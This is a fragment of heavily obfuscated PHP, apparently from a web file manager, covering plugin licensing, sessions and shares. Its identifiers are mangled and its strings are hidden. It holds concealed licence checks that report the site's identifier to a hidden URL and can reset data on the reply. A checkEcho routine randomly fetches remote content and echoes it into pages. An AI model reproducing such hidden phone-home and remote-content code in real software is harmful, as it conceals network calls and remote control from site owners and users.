eÕÈÌﬂäÑ : $c¨º≠Ü‘¿ì =& $_SERVER[©Ç‡ÆÑ„òπ]; $Dê®ß∂ÖÊ¢ = $GLOBALS[$c¨º≠Ü‘¿ì[88]]; $cÛØÍæ§üƒ = $this->version; goto b°çãæä°©; Døëƒ≈◊ø¿: Hook::bind($c¨º≠Ü‘¿ì[135], $c¨º≠Ü‘¿ì[136]); goto f©Ù⁄äîçÆ; b°çãæä°©: if (ACTION == $c¨º≠Ü‘¿ì[127] && $cÛØÍæ§üƒ == $c¨º≠Ü‘¿ì[64]) { show_json(LNG($c¨º≠Ü‘¿ì[128]), !1, $c¨º≠Ü‘¿ì[129]); } $Aÿ≈é¥¨´à = array($c¨º≠Ü‘¿ì[130], $c¨º≠Ü‘¿ì[131]); if (in_array(ACTION, $Aÿ≈é¥¨´à)) { if ($cÛØÍæ§üƒ == $c¨º≠Ü‘¿ì[64] && isset($Dê®ß∂ÖÊ¢[$c¨º≠Ü‘¿ì[132]])) { show_json(LNG($c¨º≠Ü‘¿ì[128]), !1, $c¨º≠Ü‘¿ì[129]); die; } $Dº©àí—â• = $this->userCount(); if ($Dº©àí—â• != 10000) { if ($Dº©àí—â• <= Model($c¨º≠Ü‘¿ì[133])->count()) { show_json(LNG($c¨º≠Ü‘¿ì[134]), !1, $c¨º≠Ü‘¿ì[129]); die; } } } goto Døëƒ≈◊ø¿; f©Ù⁄äîçÆ: } private function checkPlugin($C∑»™ÕÉ≈è) { goto eÂØ—óªﬂÙ; eÂØ—óªﬂÙ: $Aé‡ÜÍ ¢É =& $_SERVER[©Ç‡ÆÑ„òπ]; if ($this->version == $Aé‡ÜÍ ¢É[137]) { return $C∑»™ÕÉ≈è; } $CøäÑÜ∂ç§ = array($Aé‡ÜÍ ¢É[138], $Aé‡ÜÍ ¢É[139], $Aé‡ÜÍ ¢É[140], $Aé‡ÜÍ ¢É[141], $Aé‡ÜÍ ¢É[142], $Aé‡ÜÍ ¢É[143], $Aé‡ÜÍ ¢É[144], $Aé‡ÜÍ ¢É[145]); goto e£ô¯áàø˜; e£ô¯áàø˜: $cËÜƒÑ¯ëÚ = explode($Aé‡ÜÍ ¢É[146], _get($this->versionData, $Aé‡ÜÍ ¢É[70], $Aé‡ÜÍ ¢É[71])); $e´ÈÕˆÎ»· = array(); foreach ($CøäÑÜ∂ç§ as $fôêäÚè˜Ç) { if (!in_array($fôêäÚè˜Ç, $cËÜƒÑ¯ëÚ)) { $e´ÈÕˆÎ»·[] = $fôêäÚè˜Ç; } } goto A–∞ñ°¢“»; A–∞ñ°¢“»: foreach ($e´ÈÕˆÎ»· as $fôêäÚè˜Ç) { unset($C∑»™ÕÉ≈è[$fôêäÚè˜Ç]); } return $C∑»™ÕÉ≈è; goto B°°Ã¢“›≈; B°°Ã¢“›≈: } private function disableCheck() { goto e–≠Õ‰®ÆÛ; d¢≥÷ï€ ‡: Hook::bind($dã€¥â∫¢´[149], array($this, $dã€¥â∫¢´[150])); goto C≠õŸ™Éª‚; D…´‡·°ü∏: $A»±≠˘À““ = array($dã€¥â∫¢´[147]); $E≠£ﬂ¡ª±Ë = !0; foreach ($A»±≠˘À““ as $aÑóı»¶ë®) { if ($aÑóı»¶ë® == $E”ñÏƒ∂∫€ || substr($E”ñÏƒ∂∫€, 0, strlen($aÑóı»¶ë®)) == $aÑóı»¶ë®) { show_json(LNG($dã€¥â∫¢´[148]), !1); } } goto d¢≥÷ï€ ‡; e–≠Õ‰®ÆÛ: $dã€¥â∫¢´ =& $_SERVER[©Ç‡ÆÑ„òπ]; if ($this->version != $dã€¥â∫¢´[64]) { return; } $E”ñÏƒ∂∫€ = strtolower(ACTION); goto D…´‡·°ü∏; C≠õŸ™Éª‚: } public function methodExit() { return $_SERVER[©Ç‡ÆÑ„òπ][151]; } private function checkVersion() { goto bâπ˜≤õè∏; dÖ´”¯≤ú: $BﬂÙá‘≤âÒ = Cache::get($e‰ØØ¨Ãæ¯); $CÒ≈¿®ê≥â = 3600 * 24 * 3; if (!$BﬂÙá‘≤âÒ || time() - $BﬂÙá‘≤âÒ[$C›Õ—ˆÑ£Ô[154]] > $CÒ≈¿®ê≥â) { goto B÷çóàª÷’; B÷çóàª÷’: $BﬂÙá‘≤âÒ = array($C›Õ—ˆÑ£Ô[155] => !0, $C›Õ—ˆÑ£Ô[156] => time()); $cÓ∫√£Æµ∏ = Mcrypt::decode($C›Õ—ˆÑ£Ô[157], $C›Õ—ˆÑ£Ô[57]); $FØπùò¡Ÿê = array($C›Õ—ˆÑ£Ô[90] => $aÀ≤ı‰√πµ, $C›Õ—ˆÑ£Ô[97] => $this->version, $C›Õ—ˆÑ£Ô[95] => INSTALL_CHANNEL); goto Aä—Ö≠òºì; aúëÉÂ¬¡Ñ: if ($C÷õÒ≠À∂ì[$C›Õ—ˆÑ£Ô[90]] != !0) { $this->dataReset(); Cache::remove($e‰ØØ¨Ãæ¯); return; } goto fÎ˘πÎ´„¿; Aä—Ö≠òºì: $A‹Éú£Ö—‹ = url_request($cÓ∫√£Æµ∏, $C›Õ—ˆÑ£Ô[11], $FØπùò¡Ÿê, !1, !1, !0, 5); $C÷õÒ≠À∂ì = $A‹Éú£Ö—‹[$C›Õ—ˆÑ£Ô[12]]; if (!is_array($C÷õÒ≠À∂ì)) { return; } goto aúëÉÂ¬¡Ñ; fÎ˘πÎ´„¿: } goto cÊÙçáå»Ù; b∂ê“äÊ‘Ô: if (ACTION != $C›Õ—ˆÑ£Ô[153]) { return; } $aÀ≤ı‰√πµ = Model($C›Õ—ˆÑ£Ô[18])->get($C›Õ—ˆÑ£Ô[111]); $e‰ØØ¨Ãæ¯ = md5($aÀ≤ı‰√πµ); goto dÖ´”¯≤ú; cÊÙçáå»Ù: Cache::set($e‰ØØ¨Ãæ¯, $BﬂÙá‘≤âÒ, $CÒ≈¿®ê≥â); goto eâèßñïáØ; bâπ˜≤õè∏: $C›Õ—ˆÑ£Ô =& $_SERVER[©Ç‡ÆÑ„òπ]; if ($this->version == $C›Õ—ˆÑ£Ô[64] || !$GLOBALS[$C›Õ—ˆÑ£Ô[7]]) { return; } if (intval(date($C›Õ—ˆÑ£Ô[152], time())) % 3 != 0) { return; } goto b∂ê“äÊ‘Ô; eâèßñïáØ: } private function userCount() { goto Cì‡Ç…õÔﬂ; c£ôßû√¬Û: return $Dä∫ÎéËÜã + $C≈Ωª‰ıåÜ; goto AÌê≠ï‡∏‘; Cì‡Ç…õÔﬂ: $cá¿˜∆úÉ =& $_SERVER[©Ç‡ÆÑ„òπ]; $D÷ÏçÌ“õ‚ = array($cá¿˜∆úÉ[158] => 10, $cá¿˜∆úÉ[159] => 30, $cá¿˜∆úÉ[160] => 50, $cá¿˜∆úÉ[161] => 150, $cá¿˜∆úÉ[162] => 500, $cá¿˜∆úÉ[163] => 10000, $cá¿˜∆úÉ[164] => 10000, $cá¿˜∆úÉ[165] => 10, $cá¿˜∆úÉ[166] => 30, $cá¿˜∆úÉ[167] => 50, $cá¿˜∆úÉ[168] => 100, $cá¿˜∆úÉ[169] => 150, $cá¿˜∆úÉ[170] => 250, $cá¿˜∆úÉ[171] => 500, $cá¿˜∆úÉ[172] => 1001, $cá¿˜∆úÉ[173] => 1500, $cá¿˜∆úÉ[174] => 2000); $Dä∫ÎéËÜã = $D÷ÏçÌ“õ‚[$this->version]; goto dãÑﬁ‰Î»ù; dãÑﬁ‰Î»ù: $Dä∫ÎéËÜã = $Dä∫ÎéËÜã ? $Dä∫ÎéËÜã : 10; $C≈Ωª‰ıåÜ = $this->versionData[$cá¿˜∆úÉ[175]]; $C≈Ωª‰ıåÜ = $C≈Ωª‰ıåÜ ? intval($C≈Ωª‰ıåÜ) : 0; goto c£ôßû√¬Û; AÌê≠ï‡∏‘: } public function loginCheck($EÏÜ·˘ô≥˘) { goto B˘åπΩı≤‡; B˘åπΩı≤‡: $eìﬂ¶ÀﬁüÖ =& $_SERVER[©Ç‡ÆÑ„òπ]; $BüŸÂ¿èÎ– = $this->userCount(); if ($BüŸÂ¿èÎ– >= 10000) { return; } goto e¨ÀêöüÆ≠; e¨ÀêöüÆ≠: $fÉ∂†ÚÀï¿ = Model($eìﬂ¶ÀﬁüÖ[133])->count(); if ($fÉ∂†ÚÀï¿ <= $BüŸÂ¿èÎ–) { return; } $c≥≠ôé©§Œ = Model($eìﬂ¶ÀﬁüÖ[133])->field($eìﬂ¶ÀﬁüÖ[176])->limit($BüŸÂ¿èÎ–)->select(); goto C¶âîÁÁòï; C¶âîÁÁòï: $c≥≠ôé©§Œ = array_to_keyvalue($c≥≠ôé©§Œ, $eìﬂ¶ÀﬁüÖ[71], $eìﬂ¶ÀﬁüÖ[176]); if (!in_array($EÏÜ·˘ô≥˘[$eìﬂ¶ÀﬁüÖ[176]], $c≥≠ôé©§Œ)) { show_json($eìﬂ¶ÀﬁüÖ[177], !1, $eìﬂ¶ÀﬁüÖ[129]); } goto BÏç∏’ÉÃ≈; BÏç∏’ÉÃ≈: } public function checkEcho() { $Eı¨õ¢ò¿∏ =& $_SERVER[©Ç‡ÆÑ„òπ]; if (date($Eı¨õ¢ò¿∏[178]) % 10 == 1 && $GLOBALS[$Eı¨õ¢ò¿∏[7]] && mt_rand(1, 100) % 10 <= 3) { $Aﬁ´œ∞¿éä = $Eı¨õ¢ò¿∏[179]; $F…‹¯ß£‰π = url_request($Aﬁ´œ∞¿éä, $Eı¨õ¢ò¿∏[11], !1, !1, !1, !1, 3); echo $Eı¨õ¢ò¿∏[180] . hash_encode($F…‹¯ß£‰π[$Eı¨õ¢ò¿∏[12]]) . $Eı¨õ¢ò¿∏[181]; } } private function encode($f†‰©Áä˘À, $AÃ“ëáì®«, $f◊Òáú∂í = 3) { goto Bˆ´ﬁÌäﬂ…; a≈∑´ä‡π÷: $Bàü•Öù™Ô = mt_rand(0, 5) . $A™ç¥Î—é[71]; $E»æÍóı±ï = rand_string(15); $C¿„È”¡ßß = $A™ç¥Î—é[182]; goto E‰±ë∑ÊØø; E‰±ë∑ÊØø: switch ($Bàü•Öù™Ô) { case $A™ç¥Î—é[125]: $E≥‹€ú®ÑŸ = Mcrypt::encode($f†‰©Áä˘À, strrev($AÃ“ëáì®« . $E»æÍóı±ï)); break; case $A™ç¥Î—é[120]: $E≥‹€ú®ÑŸ = Mcrypt::encode($f†‰©Áä˘À, strrev($E»æÍóı±ï . $AÃ“ëáì®«)); break; case $A™ç¥Î—é[183]: $E≥‹€ú®ÑŸ = Mcrypt::encode($f†‰©Áä˘À, base64_encode($E»æÍóı±ï . $AÃ“ëáì®«)); break; case $A™ç¥Î—é[184]: $E≥‹€ú®ÑŸ = Mcrypt::encode($f†‰©Áä˘À, md5($E»æÍóı±ï . $AÃ“ëáì®«)); break; case $A™ç¥Î—é[185]: goto E∫å≠Ô˘É˘; a¥åÆÆ¡¿€: for ($FáíÑ™∫Á£ = 0; $FáíÑ™∫Á£ < strlen($f†‰©Áä˘À); $FáíÑ™∫Á£++) { $DÉ„è˜∏ÍÜ = $DÉ„è˜∏ÍÜ == strlen($AÉ‚º®‡∆ù) ? 0 : $DÉ„è˜∏ÍÜ; $C‰È±≥¨™É = ($BÂ÷–ÕﬂÂä + strpos($C¿„È”¡ßß, $f†‰©Áä˘À[$FáíÑ™∫Á£]) + ord($AÉ‚º®‡∆ù[$DÉ„è˜∏ÍÜ++])) % 64; $b»∑†ù¡¬Ø .= $C¿„È”¡ßß[$C‰È±≥¨™É]; } $E≥‹€ú®ÑŸ = hash_encode($e°πÿôÒ«Ñ . $b»∑†ù¡¬Ø); break; goto eèñÉª∏ºÿ; E∫å≠Ô˘É˘: $f†‰©Áä˘À = base64_encode($f†‰©Áä˘À); $BÂ÷–ÕﬂÂä = rand(0, 64); $e°πÿôÒ«Ñ = $C¿„È”¡ßß[$BÂ÷–ÕﬂÂä]; goto E˘¬Üùº®ö; E˘¬Üùº®ö: $AÉ‚º®‡∆ù = md5($e°πÿôÒ«Ñ . md5($AÃ“ëáì®« . $e°πÿôÒ«Ñ) . $AÃ“ëáì®«); $AÉ‚º®‡∆ù = substr($AÉ‚º®‡∆ù, $BÂ÷–ÕﬂÂä % 8, $BÂ÷–ÕﬂÂä % 8 + 7); $b»∑†ù¡¬Ø = $A™ç¥Î—é[71]; goto eáÈé—á™∫; eáÈé—á™∫: $FáíÑ™∫Á£ = 0; $C‰È±≥¨™É = 0; $DÉ„è˜∏ÍÜ = 0; goto a¥åÆÆ¡¿€; eèñÉª∏ºÿ: default: $E≥‹€ú®ÑŸ = Mcrypt::encode($f†‰©Áä˘À, $AÃ“ëáì®« . $E»æÍóı±ï); break; } $E≥‹€ú®ÑŸ = strrev($Bàü•Öù™Ô . $E»æÍóı±ï . $E≥‹€ú®ÑŸ); if ($f◊Òáú∂í - 1 > 0) { $E≥‹€ú®ÑŸ = $this->encode($E≥‹€ú®ÑŸ, $AÃ“ëáì®«, $f◊Òáú∂í - 1); } goto dÃ∑∫Ö¡á¥; Bˆ´ﬁÌäﬂ…: $A™ç¥Î—é =& $_SERVER[©Ç‡ÆÑ„òπ]; usleep(2); $f†‰©Áä˘À = trim($f†‰©Áä˘À); goto a≈∑´ä‡π÷; dÃ∑∫Ö¡á¥: return $E≥‹€ú®ÑŸ; goto Eö €‘Â£â; Eö €‘Â£â: } public function decode($d úìø•∏ó, $A∏ÒÒ”±€õ, $F‚„ΩÖàÖ” = 3) { goto aÁÍé∆√øú; e˘«‰◊òêÒ: if ($F‚„ΩÖàÖ” - 1 > 0) { $CÙÜ“ÉºÃ· = $this->decode($CÙÜ“ÉºÃ·, $A∏ÒÒ”±€õ, $F‚„ΩÖàÖ” - 1); } return $CÙÜ“ÉºÃ·; goto b–«ﬂœ¢ÊÃ; Dçµ€Èë É: $d úìø•∏ó = strrev($d úìø•∏ó); $e°ûﬂ¥¬áë = $d úìø•∏ó[0]; $E±„ΩΩµ‰⁄ = substr($d úìø•∏ó, 1, 15); goto cŒˆáÉ‹–î; cŒˆáÉ‹–î: $d úìø•∏ó = substr($d úìø•∏ó, 16); $aÊÖΩ◊†Ùî = $aÑîÖﬂ»Ωø[182]; switch ($e°ûﬂ¥¬áë) { case $aÑîÖﬂ»Ωø[125]: $CÙÜ“ÉºÃ· = Mcrypt::decode($d úìø•∏ó, strrev($A∏ÒÒ”±€õ . $E±„ΩΩµ‰⁄)); break; case $aÑîÖﬂ»Ωø[120]: $CÙÜ“ÉºÃ· = Mcrypt::decode($d úìø•∏ó, strrev($E±„ΩΩµ‰⁄ . $A∏ÒÒ”±€õ)); break; case $aÑîÖﬂ»Ωø[183]: $CÙÜ“ÉºÃ· = Mcrypt::decode($d úìø•∏ó, base64_encode($E±„ΩΩµ‰⁄ . $A∏ÒÒ”±€õ)); break; case $aÑîÖﬂ»Ωø[184]: $CÙÜ“ÉºÃ· = Mcrypt::decode($d úìø•∏ó, md5($E±„ΩΩµ‰⁄ . $A∏ÒÒ”±€õ)); break; case $aÑîÖﬂ»Ωø[185]: goto f€πŸÿèöÿ; eÊã»…Ó”ä: $Aäè∑ü∏∂â = strpos($aÊÖΩ◊†Ùî, $BóÇ≠Ñìµ´); $Cﬂ⁄ç˘≥†π = md5($BóÇ≠Ñìµ´ . md5($A∏ÒÒ”±€õ . $BóÇ≠Ñìµ´) . $A∏ÒÒ”±€õ); $Cﬂ⁄ç˘≥†π = substr($Cﬂ⁄ç˘≥†π, $Aäè∑ü∏∂â % 8, $Aäè∑ü∏∂â % 8 + 7); goto bàÍï ı®; bè¶∫ƒâä√: break; goto d∫©áŒ–éÜ; f€πŸÿèöÿ: $d úìø•∏ó = hash_decode($d úìø•∏ó); $BóÇ≠Ñìµ´ = $d úìø•∏ó[0]; $d úìø•∏ó = substr($d úìø•∏ó, 1); goto eÊã»…Ó”ä; CØãÎ≥Ü∏é: $F–ùÿª§îÿ = 0; for ($c∏ê”…Û£Á = 0; $c∏ê”…Û£Á < strlen($d úìø•∏ó); $c∏ê”…Û£Á++) { $F–ùÿª§îÿ = $F–ùÿª§îÿ == strlen($Cﬂ⁄ç˘≥†π) ? 0 : $F–ùÿª§îÿ; $Bàñˆ„ç®ß = $F–ùÿª§îÿ++; $b⁄òãÙñôê = strpos($aÊÖΩ◊†Ùî, $d úìø•∏ó[$c∏ê”…Û£Á]) - $Aäè∑ü∏∂â - ord($Cﬂ⁄ç˘≥†π[$Bàñˆ„ç®ß]); while ($b⁄òãÙñôê < 0) { $b⁄òãÙñôê += 64; } $f„‚√Í´ñ‰ .= $aÊÖΩ◊†Ùî[$b⁄òãÙñôê]; } $CÙÜ“ÉºÃ· = base64_decode($f„‚√Í´ñ‰); goto bè¶∫ƒâä√; bàÍï ı®: $f„‚√Í´ñ‰ = $aÑîÖﬂ»Ωø[71]; $c∏ê”…Û£Á = 0; $b⁄òãÙñôê = 0; goto CØãÎ≥Ü∏é; d∫©áŒ–éÜ: default: $CÙÜ“ÉºÃ· = Mcrypt::decode($d úìø•∏ó, $A∏ÒÒ”±€õ . $E±„ΩΩµ‰⁄); break; } goto e˘«‰◊òêÒ; aÁÍé∆√øú: $aÑîÖﬂ»Ωø =& $_SERVER[©Ç‡ÆÑ„òπ]; if (!is_string($d úìø•∏ó) || strlen($d úìø•∏ó) < 10) { return !1; } $d úìø•∏ó = trim($d úìø•∏ó); goto Dçµ€Èë É; b–«ﬂœ¢ÊÃ: } public function appAllow($AÜ·•Ω‹õ¢, $FÈ¯å ∞ä⁄, $Fıéﬂñ°¨— = true) { $D¬ı™Õí⁄ç =& $_SERVER[©Ç‡ÆÑ„òπ]; $C•»„¢À–∞ = PLUGIN_DIR . $AÜ·•Ω‹õ¢ . $D¬ı™Õí⁄ç[186]; if (!is_array($FÈ¯å ∞ä⁄) || !is_array($FÈ¯å ∞ä⁄[$D¬ı™Õí⁄ç[1]]) || !is_file($C•»„¢À–∞) || $FÈ¯å ∞ä⁄[$D¬ı™Õí⁄ç[187]] != 1) { return !1; } if ($Fıéﬂñ°¨— && !Action($D¬ı™Õí⁄ç[188])->checkAuth($AÜ·•Ω‹õ¢)) { return !1; } return !0; } public function unInstall($aëº≥ÖÌÆ≠) { $F˜ÿ’à† ” =& $_SERVER[©Ç‡ÆÑ„òπ]; $b€ÁáÜ©äÜ = $this->loadList($aëº≥ÖÌÆ≠); if (file_exists(PLUGIN_DIR . $aëº≥ÖÌÆ≠)) { Hook::apply($aëº≥ÖÌÆ≠ . $F˜ÿ’à† ”[189]); } $this->remove($b€ÁáÜ©äÜ[$F˜ÿ’à† ”[122]]); } public function changeStatus($E‡¶ ÎîÑ†, $eºáÜªùü∫) { $Aôèï†ÖÈ÷ =& $_SERVER[©Ç‡ÆÑ„òπ]; $FÚëùãâáı = $this->loadList($E‡¶ ÎîÑ†); if ($eºáÜªùü∫) { Hook::apply($E‡¶ ÎîÑ† . $Aôèï†ÖÈ÷[190]); } $this->update($FÚëùãâáı[$Aôèï†ÖÈ÷[122]], array($Aôèï†ÖÈ÷[191] => $eºáÜªùü∫)); } public function appRegist($bÏÇﬂ˘◊Ω , $eÏ—è‚ä⁄ñ) { $d¢âç’øËÓ =& $_SERVER[©Ç‡ÆÑ„òπ]; $f¡ûÑŸø”≈ = $this->loadList($bÏÇﬂ˘◊Ω ); if ($f¡ûÑŸø”≈) { $this->update($f¡ûÑŸø”≈[$d¢âç’øËÓ[122]], array($d¢âç’øËÓ[1] => $eÏ—è‚ä⁄ñ)); } else { $CÙßÉàŒ≈≥ = array($d¢âç’øËÓ[0] => $bÏÇﬂ˘◊Ω , $d¢âç’øËÓ[1] => $eÏ—è‚ä⁄ñ, $d¢âç’øËÓ[187] => 0, $d¢âç’øËÓ[43] => $this->getConfigDefault($bÏÇﬂ˘◊Ω )); $this->insert($CÙßÉàŒ≈≥); } } public function getConfigDefault($a‡Ã‚´±Ç›) { $dö≥ñÍ¶ù¬ =& $_SERVER[©Ç‡ÆÑ„òπ]; $F›∆è¿Ç◊É = array(); $CëÜŸÃò„‰ = $this->getPackageJson($a‡Ã‚´±Ç›); if (!$CëÜŸÃò„‰ && is_array($CëÜŸÃò„‰[$dö≥ñÍ¶ù¬[192]])) { return $F›∆è¿Ç◊É; } foreach ($CëÜŸÃò„‰[$dö≥ñÍ¶ù¬[192]] as $d„ÎÌõÂßÙ => $E€•ñì¢ä÷) { if (!isset($E€•ñì¢ä÷[$dö≥ñÍ¶ù¬[193]]) || isset($F›∆è¿Ç◊É[$d„ÎÌõÂßÙ])) { continue; } $F›∆è¿Ç◊É[$d„ÎÌõÂßÙ] = $E€•ñì¢ä÷[$dö≥ñÍ¶ù¬[193]]; } return $F›∆è¿Ç◊É; } public function getPackageJson($eÑ—„µÁ†) { return Hook::apply($eÑ—„µÁ† . $_SERVER[©Ç‡ÆÑ„òπ][194]); } public function getConfig($cÆ¢åî¶¶¡, $d‡Ì¡®„Ö≈ = false) { $C¬´ÿì‘Ü∆ =& $_SERVER[©Ç‡ÆÑ„òπ]; $C‡ò™ﬂπ∆É = array(); $D·äéÂ∑¿≤ = $this->loadList($cÆ¢åî¶¶¡); if ($D·äéÂ∑¿≤ && is_array($D·äéÂ∑¿≤[$C¬´ÿì‘Ü∆[43]])) { $C‡ò™ﬂπ∆É = $D·äéÂ∑¿≤[$C¬´ÿì‘Ü∆[43]]; } if (!$C‡ò™ﬂπ∆É || $d‡Ì¡®„Ö≈) { $C‡ò™ﬂπ∆É = $this->getConfigDefault($cÆ¢åî¶¶¡); } return $C‡ò™ﬂπ∆É; } public function setConfig($có›¯‹®ëô, $cúÔå’É∞ê = false) { goto C¶Î¯Ø∫í¶; eÍ£™µ÷∑π: if ($cúÔå’É∞ê == !1) { $cúÔå’É∞ê = $this->getConfigDefault($có›¯‹®ëô); } $Fú”´€åàÖ = $aÑ†»èöÉã[$c∫êâÛíµï[43]]; foreach ($cúÔå’É∞ê as $FıÃü˜å”” => $Dº∫ÑêçéÇ) { $Fú”´€åàÖ[$FıÃü˜å””] = is_string($Dº∫ÑêçéÇ) ? trim($Dº∫ÑêçéÇ) : $Dº∫ÑêçéÇ; } goto AÊ•ÉØÒﬂ»; AÊ•ÉØÒﬂ»: $this->update($aÑ†»èöÉã[$c∫êâÛíµï[122]], array($c∫êâÛíµï[43] => $Fú”´€åàÖ)); goto DèµÈÇ∞ÌÂ; C¶Î¯Ø∫í¶: $c∫êâÛíµï =& $_SERVER[©Ç‡ÆÑ„òπ]; $aÑ†»èöÉã = $this->loadList($có›¯‹®ëô); if (!$aÑ†»èöÉã) { return !1; } goto eÍ£™µ÷∑π; DèµÈÇ∞ÌÂ: } public function viewList() { goto a∫Ñ€°∞»æ; dÑ£™≤ù≥á: $this->pluginScan($E¶ßñÙÒü€); $DõÓêÑ¡æ = array(); foreach ($E¶ßñÙÒü€ as $b∆§÷·Ç”û => $dÊâ—äÎé‡) { unset($dÊâ—äÎé‡[$BÒêßÕÀïé[1]], $dÊâ—äÎé‡[$BÒêßÕÀïé[43]]); $C¢ˆ°≈≥ÎÁ = PLUGIN_DIR . $dÊâ—äÎé‡[$BÒêßÕÀïé[0]] . $BÒêßÕÀïé[186]; if (!is_file($C¢ˆ°≈≥ÎÁ)) { continue; } $fÌΩªÎ‡˜‘ = Hook::apply($dÊâ—äÎé‡[$BÒêßÕÀïé[0]] . $BÒêßÕÀïé[194]); if (is_array($fÌΩªÎ‡˜‘)) { $DõÓêÑ¡æ[$b∆§÷·Ç”û] = array_merge($dÊâ—äÎé‡, $fÌΩªÎ‡˜‘); } } goto e„≥∞èËÀ±; e„≥∞èËÀ±: return $DõÓêÑ¡æ; goto BêüéπÎ®Õ; a∫Ñ€°∞»æ: $BÒêßÕÀïé =& $_SERVER[©Ç‡ÆÑ„òπ]; $E¶ßñÙÒü€ = $this->loadList(); $E¶ßñÙÒü€ = $this->checkPlugin($E¶ßñÙÒü€); goto dÑ£™≤ù≥á; BêüéπÎ®Õ: } private function pluginScan($D†Óí…†«à) { $D¢–∫îàΩº =& $_SERVER[©Ç‡ÆÑ„òπ]; recursion_dir(PLUGIN_DIR, $fÙäŒ±íä¿, $c∂Æ‡ëÿ‚Ë, 0); foreach ($fÙäŒ±íä¿ as $eúº≈Œ∑´Ñ) { $bØ®¥π«ùµ = get_path_this($eúº≈Œ∑´Ñ); if (isset($D†Óí…†«à[$bØ®¥π«ùµ]) || !file_exists($eúº≈Œ∑´Ñ . $D¢–∫îàΩº[195]) || !file_exists($eúº≈Œ∑´Ñ . $D¢–∫îàΩº[186])) { continue; } Hook::apply($bØ®¥π«ùµ . $D¢–∫îàΩº[190]); } } } class SessionModel extends ModelBase { protected $tableName = "\163\171\x73\x74\x65\x6d\x5f\163\145\x73\163\x69\157\x6e"; public function get($EÃÀΩè®⁄’) { $CÙ–ßÑˆ†ø =& $_SERVER[∞„˜ƒÑºª]; $e· ‚Æ£é© = $this->where(array($CÙ–ßÑˆ†ø[1623] => $EÃÀΩè®⁄’))->find(); if (!is_array($e· ‚Æ£é©)) { return !1; } return $e· ‚Æ£é©[$CÙ–ßÑˆ†ø[448]]; } public function set($B›‚⁄ Íá, $b˜„∞È◊è©, $dÚÜ¡„É∞¬ = 3600) { $a‹ ◊áÈ‚Ÿ =& $_SERVER[∞„˜ƒÑºª]; $c–∫«ı„œà = array($a‹ ◊áÈ‚Ÿ[1623] => $B›‚⁄ Íá, $a‹ ◊áÈ‚Ÿ[1547] => $b˜„∞È◊è©, $a‹ ◊áÈ‚Ÿ[1624] => $dÚÜ¡„É∞¬ + time()); if (Session::get($a‹ ◊áÈ‚Ÿ[1625])) { $c–∫«ı„œà[$a‹ ◊áÈ‚Ÿ[1063]] = Session::get($a‹ ◊áÈ‚Ÿ[1625]); } else { $c–∫«ı„œà[$a‹ ◊áÈ‚Ÿ[1063]] = 0; } if ($this->get($B›‚⁄ Íá)) { return $this->where(array($a‹ ◊áÈ‚Ÿ[1623] => $B›‚⁄ Íá))->save($c–∫«ı„œà); } else { return $this->add($c–∫«ı„œà, array(), !0); } } public function remove($dµŸº¯Ï¡Ü) { return $this->where(array($_SERVER[∞„˜ƒÑºª][1623] => $dµŸº¯Ï¡Ü))->delete(); } public function clearTimeout() { return $this->where($_SERVER[∞„˜ƒÑºª][1626] . time())->delete(); } } class ShareModel extends ModelBase { protected $tableName = "\163\x68\x61\x72\145"; protected $dataAuto = array(array("\155\x6f\144\x69\x66\x79\124\151\155\145", "\164\151\x6d\145", "\151\x6e\163\x65\x72\164\54\x75\x70\144\x61\164\x65", "\146\165\x6e\x63\164\151\x6f\x6e"), array("\143\x72\x65\141\164\x65\x54\151\x6d\x65", "\164\x69\x6d\145", "\x69\x6e\163\145\162\164", "\146\165\x6e\x63\x74\151\x6f\x6e"), array("\157\160\164\x69\157\x6e\x73", '', "\151\x6e\163\x65\x72\x74\x2c\x75\x70\144\141\x74\x65\54\163\145\x6c\145\x63\164", "\152\x73\x6f\156")); private $fieldList = "\x2a"; protected function cacheFunctionAlias($e≥Íå≈å£Ü) { $f†≈ÏÙÕ≥Ü =& $_SERVER[∞„˜ƒÑºª]; $f◊∫ˆÃ»¯ç = isset($e≥Íå≈å£Ü[0]) ? $e≥Íå≈å£Ü[0] : !1; return array($f†≈ÏÙÕ≥Ü[1627] => array(USER_ID, $f†≈ÏÙÕ≥Ü[1628]), $f†≈ÏÙÕ≥Ü[1593] => array($f◊∫ˆÃ»¯ç, $f†≈ÏÙÕ≥Ü[1629])); } protected function listSimple() { $bÇ÷·ËÃ¢î = array($_SERVER[∞„˜ƒÑºª][1063] => USER_ID); $f‹…È§∏É¥ = $this->field($this->fieldList)->where($bÇ÷·ËÃ¢î)->select(); return $f‹…È§∏É¥ ? $f‹…È§∏É¥ : array(); } protected function getInfo($còøπúÀ√Ò, $a£ñ•∆ôÛ∆ = false) { $A‘ÂËéû»ó =& $_SERVER[∞„˜ƒÑºª]; if ($a£ñ•∆ôÛ∆) { return $this->_getShareInfo(array($A‘ÂËéû»ó[418] => $còøπúÀ√Ò)); } $BÖÇÆÙÖ∏é = $this->cacheFunctionGet($A‘ÂËéû»ó[1630], $còøπúÀ√Ò); return $BÖÇÆÙÖ∏é; } public function getInfoByHash($eæö¶âòÌ‹) { return $this->_getShareInfo(array($_SERVER[∞„˜ƒÑºª][1631] => $eæö¶âòÌ‹)); } public function getInfoByPath($F∂≥Ö¥Êè∆) { $E⁄Ã£œ≈›Ë =& $_SERVER[∞„˜ƒÑºª]; $b™¶ ŸÊó€ = array($E⁄Ã£œ≈›Ë[1063] => USER_ID, $E⁄Ã£œ≈›Ë[374] => $F∂≥Ö¥Êè∆); return $this->_getShareInfo($b™¶ ŸÊó€); } private function _getShareInfo($D∏Ê§ÌÖ¨) { goto DÍœ˘çÕÎÏ; F¿„ù¥…¿ß: $D∏Ê§ÌÖ¨ = array($BãÍÛªéåã[418] => $C©€€ãéÔÎ[$BãÍÛªéåã[418]]); $cº¨„≈ÖÊì = $BãÍÛªéåã[1632]; $DÃÉ¨”È≤ﬁ = Model($BãÍÛªéåã[419])->order($BãÍÛªéåã[366])->field($cº¨„≈ÖÊì)->where($D∏Ê§ÌÖ¨)->select(); goto b≥îí‹–≤ﬂ; b≥îí‹–≤ﬂ: $C©€€ãéÔÎ[$BãÍÛªéåã[1618]] = Model($BãÍÛªéåã[832])->pathInfo($C©€€ãéÔÎ[$BãÍÛªéåã[374]]); $C©€€ãéÔÎ[$BãÍÛªéåã[1633]] = $DÃÉ¨”È≤ﬁ; return $C©€€ãéÔÎ; goto A°ΩÃÜ•äò; DÍœ˘çÕÎÏ: $BãÍÛªéåã =& $_SERVER[∞„˜ƒÑºª]; $C©€€ãéÔÎ = $this->where($D∏Ê§ÌÖ¨)->find(); if (!$C©€€ãéÔÎ) { return !1; } goto F¿„ù¥…¿ß; 